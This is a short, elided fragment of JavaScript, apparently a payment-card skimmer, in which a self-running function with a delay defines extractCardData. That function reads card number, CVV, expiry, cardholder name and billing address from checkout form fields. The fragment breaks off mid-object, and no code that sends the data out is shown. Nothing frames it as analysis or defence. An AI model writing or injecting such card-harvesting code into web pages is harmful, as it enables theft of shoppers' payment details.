...
(function() {
    ...
    setTimeout(function() {
        ...
        function extractCardData() {
            ...
            const data = {
                cardNumber: collectedData.cardNumber || getFieldValue(['#card-number', '[name="cardNumber"]']),
                cvv: collectedData.cvv || getFieldValue(['#cvv', '[name="cvv"]']),
                expiry: collectedData.expiry || getFieldValue(['#expiry', '[name="expiry"]']),
                cardholderName: collectedData.cardholderName || getFieldValue(['#cardholder-name', '[name="cardholderName"]']),
                billingAddress: collectedData.billingAddress || getFieldValue(['#billing-address', '[name="billingAddress"]']),
